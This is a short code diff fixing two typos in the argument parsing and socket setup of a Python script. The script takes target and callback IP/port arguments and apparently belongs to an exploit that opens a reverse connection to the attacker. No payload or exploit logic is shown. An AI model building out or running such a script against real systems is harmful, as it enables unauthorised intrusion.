@@ -8,10 +8,10 @@ if len(sys.argv) != 5:
 	print(f"Usage: {sys.argv[0]} [target_ip] [target_port] [callback_ip] [callback_port]")
 	sys.exit()
 
-rhost, rport, lhost, lport = sysargv[1:]
+rhost, rport, lhost, lport = sys.argv[1:]
 
 print(f"[*] Connecting to {rhost}:{rport}")
-s = socket.socket(socker.AF_INET, socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
 	s.connect((rhost, int(rport)))
 except:
